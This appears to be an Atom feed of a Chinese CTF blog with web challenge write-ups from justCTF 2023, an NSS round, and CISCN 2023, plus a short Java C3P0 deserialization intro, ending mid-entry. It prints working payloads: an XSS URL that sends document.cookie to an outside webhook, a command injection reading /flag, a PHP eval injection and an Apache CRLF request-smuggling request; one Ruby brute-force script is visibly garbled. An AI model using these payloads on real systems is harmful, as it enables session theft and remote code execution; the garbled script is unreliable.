<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-06-06T09:45:20.659Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>justctf2023-web</title>
    <link href="https://ke1nys.github.io/posts/ddd9620c.html"/>
    <id>https://ke1nys.github.io/posts/ddd9620c.html</id>
    <published>2023-06-06T07:30:57.000Z</published>
    <updated>2023-06-06T09:45:20.659Z</updated>
    
    <content type="html"><![CDATA[<h2 id="eXtra-Safe-Security-layers"><a href="#eXtra-Safe-Security-layers" class="headerlink" title="eXtra Safe Security layers"></a>eXtra Safe Security layers</h2><p>道题的考点是       <strong>xss和nodejs代码审计</strong>   </p><p>首先他给了一个压缩包，是题目的源码</p><p><img src="../images/image-20230606153236064.png" alt="image-20230606153236064"></p><p>然后我们来进行分析</p><p><strong>关键点在这</strong></p><p><img src="../images/image-20230606153335616.png" alt="image-20230606153335616"></p><p>就是这里可以进行重新修改<code>res.user</code>的值</p><p><img src="../images/image-20230606153431868.png" alt="image-20230606153431868"></p><p>然后<code>res.user</code>的结构是这样的那么我们就可以修改</p><p> <code>unmodifiable.background</code>和一个 <code>unmodifiable.CSP</code>属性</p><p><img src="../images/image-20230606153555797.png" alt="image-20230606153555797"></p><p>然后又返回到这里，如果<code>res.user.unmodifiable.CSP</code>不为空的话就返回它，如果为空就返回<code>defaultCSP</code></p><p><strong>讲了这么多，最关键的地方来了</strong></p><p><img src="../images/image-20230606153804851.png" alt="image-20230606153804851"></p><p>这里的话会对我们的<code>unmodifiable.background</code>进行渲染并且加载</p><p>结合之前我们知道的可以对 <code>unmodifiable.background</code>和一个 <code>unmodifiable.CSP</code>属性进行修改，然后左上角<code>report</code>一下，让机器人去访问这个页面，就可以拿到这个admin页面的cookie了</p><ul><li><strong>payload</strong></li></ul><p><code>http://xssl.web.jctf.pro/?text=hi&amp;[unmodifiable][CSP]=a&amp;[unmodifiable][background]=https://webhook.site/f202667e-9179-425d-80c1-fd62da5915d4?$&#123;document.cookie&#125;</code></p><p>(<strong>国外的题目最好用这种接收http返回信息的网站，用国内vps的话会接收不到</strong>)</p><p>在这种情况下，这会将 document.cookie 发送到上面的 webhook。现在我们只需使用“报告为不当”按钮进行报告，服务器机器人就会访问此链接。机器人将通过 webhook 将 cookie 发送给我们：</p><p><img src="../images/image-20230606154247092.png" alt="image-20230606154247092"></p><p>成功加载我们构造的<code>background</code>,然后report让机器人去访问</p><p><img src="../images/image-20230606154332347.png" alt="image-20230606154332347"></p><p><img src="../images/image-20230606154344800.png" alt="image-20230606154344800"></p><p>拿到flag</p><h2 id="Dangerous-ruby"><a href="#Dangerous-ruby" class="headerlink" title="Dangerous(ruby)"></a>Dangerous(ruby)</h2><p><a href="https://www.youtube.com/watch?v=fqOcV-T_Qsc">wp讲解</a></p><p>这道题是考察ruby的  <strong>cookie伪造  和ip伪造</strong></p><p>就是通过题目代码给的构造<code>cookie</code>和<code>ip</code>的模板，然后根据这个模板重新构造<code>cookie</code>和<code>ip</code></p><p>  <img src="../images/image-20230606163847914.png" alt="image-20230606163847914"></p><p>题目还是先给了一个文件，让我们来审计代码</p><p>首先我们来看一下这个获取flag的要求</p><p><img src="../images/image-20230606164057404.png" alt="image-20230606164057404"></p><p>这里话是判断<code>username</code>和<code>ip</code>满不满足条件，满足的话就会返回flag</p><p><img src="../images/image-20230606164333686.png" alt="image-20230606164333686"></p><p>然后看这里的前端代码  这里的reply是下面的样子，</p><p><img src="../images/image-20230606164427160.png" alt="image-20230606164427160"></p><p><img src="../images/image-20230606164534853.png" alt="image-20230606164534853"></p><p>和上述页面对应上了</p><p>这就是这个页面返回的结果    (<strong>并且还返回了admin的用户名</strong>)</p><p>但是我们得进行session的伪造，以为现在的<strong>session.user</strong>并不是<code>janitor</code></p><p><img src="../images/image-20230606165011293.png" alt="image-20230606165011293"></p><p>点进去这个<code>new thread</code>的时候会返回一堆信息</p><p><img src="../images/image-20230606165116320.png" alt="image-20230606165116320"></p><p>这里返回了一个最关键的信息就是cookie是咋样生成的，并且还给了生成cookie的secret</p><p>然后我们就可以进行伪造了</p><p><code>:coder=&gt;#&lt;Rack::Protection::EncryptedCookie::Marshal:0x00007ff401b9a530&gt;&#125;</code>根据这个模板来进行</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;encrypted_cookie&#x27;</span></span><br><span class="line"></span><br><span class="line">use <span class="title class_">Rack</span><span class="symbol">:</span><span class="symbol">:Protection</span><span class="symbol">:</span><span class="symbol">:EncryptedCookie</span>,</span><br><span class="line">  <span class="symbol">:secret</span> =&gt; <span class="string">&#x27;a9316e61bc75029d52f915823d7bb628a4adae8b174bce89fd38ec4c7fb925a07e2ccbc01572b9fdce56502ef5d02609e5194a5ddd649ff349a206002e96a99d&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  session[<span class="symbol">:username</span>] = <span class="string">&#x27;janitor&#x27;</span></span><br><span class="line">  <span class="string">&quot;session: &quot;</span> + session.inspect + request.ip</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>然后把cookie进行传参，就可以绕过第一个检测了</p><p>接下来我们就得看看ip怎么进行伪造了</p><p><img src="../images/image-20230606173836307.png" alt="image-20230606173836307"></p><p><strong>就是这里的会对ip和id相加后进行加密后，然后截取</strong></p><p><img src="../images/image-20230606173937628.png" alt="image-20230606173937628"></p><p><img src="../images/image-20230606173951264.png" alt="image-20230606173951264"></p><p>然后写个脚本来对这个ip进行破解</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;digest&quot;</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> <span class="number">0</span>..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">  puts d</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="number">0</span>..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">for</span> b <span class="keyword">in</span> @..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="number">0</span>..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">          <span class="keyword">if</span> <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:SHA256</span>.hexdigestd.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span>+c.to s+<span class="string">&quot;.&quot;</span>+b.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span> + a.to <span class="number">5</span> + <span class="string">&quot;1&quot;</span>).slice(<span class="number">0</span>, <span class="number">6</span>) == <span class="string">&quot;32cae2&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:SHA256</span>.hexdigest(d.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span>+.to s+<span class="string">&quot;.&quot;</span>+b.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span> + a.to <span class="number">5</span> + <span class="string">&quot;2&quot;</span>).slice(<span class="number">0</span>, <span class="number">6</span>) == <span class="string">&quot;92e1e8&#x27;</span></span><br><span class="line"><span class="string">              puts d.to s+&quot;</span>.<span class="string">&quot;+c.to s+&quot;</span>.<span class="string">&quot;+b.to s+&quot;</span>.<span class="string">&quot;+ a.to s</span></span><br><span class="line"><span class="string">            end</span></span><br><span class="line"><span class="string">          end</span></span><br><span class="line"><span class="string">        end</span></span><br><span class="line"><span class="string">      end</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">  end</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">puts &quot;</span>finished<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>然后提交之后就会返回flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;eXtra-Safe-Security-layers&quot;&gt;&lt;a href=&quot;#eXtra-Safe-Security-layers&quot; class=&quot;headerlink&quot; title=&quot;eXtra Safe Security layers&quot;&gt;&lt;/a&gt;eXtra Sa</summary>
      
    
    
    
    
    <category term="justctf2023-web" scheme="https://ke1nys.github.io/tags/justctf2023-web/"/>
    
  </entry>
  
  <entry>
    <title>NSS-round13-web</title>
    <link href="https://ke1nys.github.io/posts/8e9667d4.html"/>
    <id>https://ke1nys.github.io/posts/8e9667d4.html</id>
    <published>2023-06-04T09:14:16.000Z</published>
    <updated>2023-06-05T10:20:17.791Z</updated>
    
    <content type="html"><![CDATA[<h2 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h2><p>考察的是session伪造</p><p>(不写了，就是简单的session伪造)</p><h2 id="flask-jwt-hard-session伪造"><a href="#flask-jwt-hard-session伪造" class="headerlink" title="flask?jwt?(hard,session伪造)"></a>flask?jwt?(hard,session伪造)</h2><p><strong>考察的也是session伪造  只不过这里把key藏起来了，我们得去找到</strong></p><p>这里的考点是通过报错来获取到<code>secret_key</code></p><p>注册完后进行登录</p><p><img src="../images/image-20230604173436773.png" alt="image-20230604173436773"></p><p>提示你有这个<code>/wor</code>目录</p><p><img src="../images/image-20230604173501780.png" alt="image-20230604173501780"></p><p>告诉你了登录时间(<strong>那么我们就去找一下登录时间是从哪获取的</strong>)</p><p><img src="../images/image-20230604173742024.png" alt="image-20230604173742024"></p><p>然后我们尝试去删除一点点cookie的值使其报错</p><p><img src="../images/image-20230604173954408.png" alt="image-20230604173954408"></p><p>报错之后查看到的信息不全面，那么我们就去拿bp进行发包查看</p><p><img src="../images/image-20230604174055787.png" alt="image-20230604174055787"></p><p>然后就拿到<code>secret_key</code>了   那么我们就接着去重新构造一个cookie就行了</p><p><img src="../images/image-20230604174519826.png" alt="image-20230604174519826"></p><p>这里有个问题就是要把时间戳给删掉，，不然会构造失败</p><p><img src="../images/image-20230604174615095.png" alt="image-20230604174615095"></p><h2 id="MyWeb"><a href="#MyWeb" class="headerlink" title="MyWeb"></a>MyWeb</h2><p><strong>题目描述：试试我的JSON解析工具。</strong></p><h4 id="json的解释"><a href="#json的解释" class="headerlink" title="json的解释"></a>json的解释</h4><p><img src="../images/image-20230604181116728.png" alt="image-20230604181116728"></p><p>实际存储的json是这样的  输出的时候</p><p><img src="../images/image-20230604181140589.png" alt="image-20230604181140589"></p><p>然后进行测试一下看传入的json是咋样的</p><p><img src="../images/image-20230604181347889.png" alt="image-20230604181347889"></p><p><img src="../images/image-20230604181423212.png" alt="image-20230604181423212"></p><p><strong>然后看本地存储的样子</strong></p><p><img src="../images/image-20230604181500207.png" alt="image-20230604181500207"></p><p><strong>这样我们就理解了这个json存储的过了，那么我们就可以进行构造来绕过了</strong></p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><strong>题目代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="comment">// 写了个网页存储JSON数据，但是还不会处理json格式，这样处理应该没有什么问题吧</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;save&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;]&#x27;</span>, <span class="string">&quot;, &#x27;<span class="subst">$value</span>&#x27;]&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;read&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$data = &#x27;</span> . <span class="variable">$data</span> . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里审计一手代码，就是一个save和read的过程，我们要想eval的东西是我们想执行的，那就必须破坏它的结构，<strong>那就复制下来在本地测试测试</strong>，怎么才能闭合原有结构，让危险代码逃逸</p><p><code>addslashes</code> 这个函数是用来进行sql转义的用的</p><p><img src="../images/image-20230604175647010.png" alt="image-20230604175647010"></p><p>跟据在上面讲的内容之后，我们知道了json存储的格式是咋样的</p><p><img src="../images/image-20230604181625002.png" alt="image-20230604181625002"></p><p>我们最后要执行的是<code>eval(&#39;$data = &#39; . $data . &#39;;&#39;);</code></p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?mode=save&amp;value=]//%0a;&lt;your_php_code&gt;;//</span><br></pre></td></tr></table></figure><p>首先是这个<code>]</code>这个是为了闭合前面的<code>[</code>然后导致后面的内容可以逃逸出来</p><p>(<strong>这里虽然说json格式会报错，但是<code>file_get_contents</code>是会输出这个json文件里的全部内容的</strong>)</p><p><strong>然后<code>]//%0a;</code>这个是会注释第一行的内容，然后换到第二行</strong></p><p>然后<code>&lt;your_php_code&gt;;//</code><strong>这个是会执行我们设置的代码然后注释掉后面的代码</strong></p><p><img src="../images/image-20230604185620831.png" alt="image-20230604185620831"></p><p>这就是传进去的样子</p><p><strong>接着传值获取环境变量</strong></p><p><img src="../images/image-20230604185826603.png" alt="image-20230604185826603"></p><p><strong>第二行就会执行代码了</strong></p><p><strong>像下面的格式也是可以进行代码执行的</strong>(可以执行<strong>phpinfo()</strong>)</p><p><img src="../images/image-20230604190446540.png" alt="image-20230604190446540"></p><p><strong>总结</strong></p><ul><li>就是利用换行绕过和注释来进行绕过    并且就是这里的话学到了一点就是(<strong>就是有eval的时候并不用得一直盯着他来执行，可以换种思路来</strong>)</li></ul><p>​                      (————————————就像这道题一样————————————)</p><ul><li><strong>原本就是php代码  把eval结构破坏之后进行换到第二行然后就可以执行自己想执行的代码了</strong></li></ul><p><strong>就是以后遇到可以本地执行的代码可以拷贝下来到本地尝试进行解题</strong></p><h2 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h2><p>题目描述：原生 Linux 因数爆破工具。flag在根目录</p><p>(<strong>这题又是使用<code>%0a</code>来进行绕过从而进行命令执行的</strong>)</p><ul><li>这个%0a确实好多题的时候的解</li></ul><p><img src="../images/image-20230604201247967.png" alt="image-20230604201247967"></p><p>点进去的发现这里会对这个数字进行分解，所以就猜想这里进行了<strong>命令执行</strong></p><p>但是在数字后拼接命令的时候发现并不能同时执行(<strong>那么我们就考虑一下使用别的执行来让其两个命令同时</strong>)</p><p>这里的话 <code>; | &amp; %0a</code>都能让其执行</p><p>但是经过多次尝试，发现这里只能返回数字，那么我们就可以<strong>考虑让输出结果以八进制进行输出</strong></p><p><code>od</code>这个命令就符合我们的预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/factors/<span class="number">9</span>;od%<span class="number">20</span>-b%<span class="number">20</span>%<span class="number">2</span>fflag</span><br></pre></td></tr></table></figure><p>这里进行必须进行url编码，不然会执行失败</p><p><img src="../images/image-20230604201858291.png" alt="image-20230604201858291"></p><p><img src="../images/image-20230604201815683.png" alt="image-20230604201815683"></p><p>输出全是八进制的数字(<strong>因为都是三个数字在一起</strong>)</p><p><img src="../images/image-20230604202021231.png" alt="image-20230604202021231"></p><p><strong>总结</strong></p><p><strong>题目挺新颖的，只允许输出数字，并且是在url处进行命令执行，然后在用8进制将结果输出</strong></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="../images/image-20230604205358343.png" alt="image-20230604205358343"></p><p>这个一看就是考察<code>apache</code>的漏洞     然后当时是去查了这个版本，然后找到了一个CVE,但是不懂咋用，看了赛后解，才发现我忘记收集这个<code>apache</code>的配置文件了</p><p><a href="https://xz.aliyun.com/t/12345#toc-7">apache请求走私 CVE-2023-25690</a></p><p>然后去读取配置文件</p><p><img src="../images/image-20230604205736740.png" alt="image-20230604205736740"></p><p><img src="../images/image-20230604205748044.png" alt="image-20230604205748044"></p><p>在配置文件里发现了关键信息</p><p>做了个proxy转发，猜测flag直接就在转发后当前目录flag.txt里（瞎猜就是了，大不了多试试）,利用CRLF注入，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nssctf/<span class="number">0</span>%<span class="number">20</span>HTTP/<span class="number">1.1</span>%<span class="number">0</span>d%<span class="number">0</span>aHost:%<span class="number">20</span>localhost%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aGET%<span class="number">20</span>/flag.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230604210535493.png" alt="image-20230604210535493"></p><p>就是根据这个payload和在上面查看的apache配置文件一起得出的结果</p><p><img src="../images/image-20230604210812996.png" alt="image-20230604210812996"></p><p><strong>可惜了   当时没想到这个配置文件</strong></p><h2 id="TimeTrcer"><a href="#TimeTrcer" class="headerlink" title="TimeTrcer"></a>TimeTrcer</h2><p><img src="../images/image-20230604202607093.png" alt="image-20230604202607093"></p><p>上面是这题的考点</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;flask-jwt&quot;&gt;&lt;a href=&quot;#flask-jwt&quot; class=&quot;headerlink&quot; title=&quot;flask?jwt?&quot;&gt;&lt;/a&gt;flask?jwt?&lt;/h2&gt;&lt;p&gt;考察的是session伪造&lt;/p&gt;
&lt;p&gt;(不写了，就是简单的session伪造</summary>
      
    
    
    
    
    <category term="NSS-round13-web" scheme="https://ke1nys.github.io/tags/NSS-round13-web/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之C3P0链利用与分析</title>
    <link href="https://ke1nys.github.io/posts/35b383c2.html"/>
    <id>https://ke1nys.github.io/posts/35b383c2.html</id>
    <published>2023-06-02T15:28:01.000Z</published>
    <updated>2023-06-05T10:20:17.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>C3P0是JDBC的一个连接池组件</strong></p><ul><li><code>JDBC</code></li></ul><p>“JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。<br>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。”</p><ul><li><strong>连接池</strong></li></ul><p>“我们在讲多线程的时候说过，创建线程是一个昂贵的操作，如果有大量的小任务需要执行，并且频繁地创建和销毁线程，实际上会消耗大量的系统资源，往往创建和消耗线程所耗费的时间比执行任务的时间还长，所以，为了提高效率，可以用线程池。<br>类似的，在执行JDBC的增删改查的操作时，如果每一次操作都来一次打开连接，操作，关闭连接，那么创建和销毁JDBC连接的开销就太大了。为了避免频繁地创建和销毁JDBC连接，我们可以通过连接池（Connection Pool）复用已经创建好的连接。”</p><ul><li><code>C3p0</code></li></ul><p><strong>C3P0是</strong>一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。 使用它的开源项目有Hibernate、Spring等。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><ul><li><p><strong>URLClassLoader   也叫   http base链</strong></p></li><li><p><strong>hex base</strong></p></li><li><strong>jndi</strong></li></ul><p>一共就是这三个利用链(<strong>下面是利用链分析</strong>)</p><h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;C3P0是JDBC的一个连接池组件&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;JDBC&lt;/code&gt;&lt;/li&gt;</summary>
      
    
    
    
    
    <category term="Java安全之C3P0链利用与分析" scheme="https://ke1nys.github.io/tags/Java%E5%AE%89%E5%85%A8%E4%B9%8BC3P0%E9%93%BE%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>show-php反序列化</title>
    <link href="https://ke1nys.github.io/posts/edbe2217.html"/>
    <id>https://ke1nys.github.io/posts/edbe2217.html</id>
    <published>2023-05-31T07:13:34.000Z</published>
    <updated>2023-06-02T03:18:25.343Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="174e3c7cfd56dd9242590cad59d055a8edc3df0c85d47ac71da3067910ffc248">1a90164da2a38547586d85c848ea23234cf9ef63a8ceedbc151c794cde2931a40020b66524494be431b39f09e43fc0e4c2a536b3a7eb75d747ffa65a39de73f1db5312c92f906f50dfe6a1ae0665b81e7d1ecc97db308791f1a7dfd70021216809c04894735e6c409cdf01a7717dc8636a61a9159867356a2a2754bee9a93d78cc75b3222e698622847bd799d6ac22e1b2cf7a143ea4d3369f702ab1467ecd980b4973a00a009f52230a1bd945a674c09aa42a3c3630ebc24b95fc4074124bdb27e9a1c605d387dce6393c86c8195e956a6fa401e77acc2ae47f0fa34ee19f32be36d10bae4b5746c81371b4aa68079b96192213705ce19af81b1122468d6659a22362bddded1c03f7c657b46a61297667113f8cf2e812a20be05fe19526cf4e3a4e768970dbe3c46304d524f01c66e9c952f738c137a9b3fc118be5f756d43f068fab7a9d2a1b2fe4e3ce3d34194dbe30438ef86aa3f1051b127e619a88fb13370fa95ef2a163fac18b422cadb2f422e0de8b042a7191f14373c1ebc727a902837b9ad12724ca53cf901cd909c23efd88f2c8be8711c382556310a593b42d58eabd1d249766f8e7f207e264fb8882e27cb2f642d208513cc41b19f5e32397092bc2b44c1f5e3beb17f925e777b27e95e77b31b2f99fa372a90d506170205f148b0bf0e8b3f5cd7114f05b06c492b5d0d5b38ab33a9017e29d368252952fa1b8be292538ce5107ccba4682981b15e4fd66b73f8f3a438444bb7efb235b7796c90144b441e0a86e7c68a7616288ad8f533435d12d7ff91088474f325f0b5232eb298d623e629c02eee613600c74ac2bf2866b3cbb8161b7164295ccfd25f0edcb1ce72e1fba5af7b356307756c15de4f178abc7ad19d9db9f31491d7d9c2c1e76926a0f980472e8602581a5772d53ce58bc23265d08db48c323916815caf62c5dd05697bffceb961198fdf8f5e6ce402c02d93198221d784fa596c73d3a22a8739cf35fdaea16c3ab3b6b94aaff28e2fe7256d9edbd9843adf233338cfb9777d2056fa1ce29e053cd0e6a535a87a34f1c971ac9ac024f61b14b3c73d475e3e12dd84993cc3d0db73e37f87c855b37e33df0dd7f82f1a4824808cad66b70ab83f5138ea6f7213c43221e3baa3cbd06f4abee066cc6b11fdfd899e60f69f3acd99b85233df482a13f022f80351605cc9a6d6e2023a9474c8948efb2aad08371ed8533de3ae156a389f41a06dd5d6b5b6d68bece80805560645430d05bdaf9f8e43e5fe1f2221ea7bfc2a06012240a0c7bc158429da239f59513e42959c191aee55d285abbb3308efb7185f41583d8594d6f9961122c48774a0f79113b76de18720a8274dab3b0dcd27c5992a4da3834542ca13f6ff0327ff3f83cfdfa9f60ed1f114e16fa670233ff2aaff4bd3e29df258922f376de1f7420d17a38e9f752c84185a14c3d480d2b751a42b4a47ebf7ca3f79c2039c2dabd7974af085c2e38ea2c9bcb489c50ed9ebc449dcc7c4809febb5d3318e7ce34143e22e43d7f61733d03c54a0f1ca33c842fb6341dcc1ae4f9f8d88e13b38732d3fde3b5519fdb8cfce70a71e3ce3cc5088ef692e58d4412a2d20bd2fe133efc0d2a1f70f84952ec32eccc904e9b3335a528f47c60f0625dd91faa4b25e723875467c14406281e4c10b5a48f67fa444e0d6acd15b81901bfd2c044c8be19dfbee524451fcf3fad22623941ee640c50f0bb902e7e9ed121594b5d0400643f870cfd8aa7c3ebc580a0787a91d1d8e7fde7a9762ce287aaf688fd6757</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-php反序列化" scheme="https://ke1nys.github.io/tags/show-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ciscn-2023-web</title>
    <link href="https://ke1nys.github.io/posts/f67bf28b.html"/>
    <id>https://ke1nys.github.io/posts/f67bf28b.html</id>
    <published>2023-05-29T12:17:51.000Z</published>
    <updated>2023-05-31T13:47:45.666Z</updated>
    
    <content type="html"><![CDATA[<p>都是参考别人的wp做的复现</p><h2 id="Unzip-软链接"><a href="#Unzip-软链接" class="headerlink" title="Unzip(软链接)"></a>Unzip(软链接)</h2><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this!</span></span><br></pre></td></tr></table></figure><p>这里考察的是<strong>软链接</strong> </p><p><a href="https://cloud.tencent.com/developer/article/2287412?from=15425&amp;areaSource=102001.1&amp;traceId=1BW57UqobpgO9lrIzxmpk">软链接连接目录</a></p><p><img src="../images/image-20230531111039582.png" alt="image-20230531111039582"></p><p>跟着这里做来上传压缩文件就行了</p><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p><img src="../images/image-20230531104951995.png" alt="image-20230531104951995"></p><p>题目给了一个界面，但是如何我们就去网上搜索看是否存在漏洞这个</p><p>然后找到了一个漏洞</p><p><a 